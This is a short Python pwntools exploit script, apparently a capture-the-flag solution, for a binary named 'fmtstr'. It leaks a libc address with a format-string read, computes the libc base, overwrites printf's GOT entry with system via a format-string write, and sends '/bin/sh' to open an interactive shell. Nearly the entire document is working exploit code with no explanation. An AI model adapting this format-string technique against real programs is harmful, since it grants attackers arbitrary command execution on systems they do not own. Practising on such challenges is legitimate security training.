from pwn import *

#init

e = ELF('./fmtstr');
libc = ELF('./libc-2.31.so')

context.binary = e

p = process(e.path)

#vars

printf_got = e.got['printf']
strt_main_off = libc.symbols['__libc_start_main']
system_off = libc.symbols['system']

log.info('Printf got adr: ' + hex(printf_got))
log.info('Strt main libc off: ' + hex(strt_main_off))
log.info('System libc off: ' + hex(system_off))

#exploit

p.sendlineafter('[y/N]', 'n')

#leak libc

p.sendlineafter('input:', '#%25$p#')

p.recvuntil('#')
libc_off = int(p.recvuntil('#', drop = True), 16) - strt_main_off - 234

log.info('Libc off: ' + hex(libc_off))

#overwrite printf got with system

p.sendlineafter('input:', fmtstr_payload(6, {printf_got: libc_off + system_off}))

#call system('/bin/sh')

p.sendlineafter('input:', '/bin/sh')

#pray for flag

p.interactive()
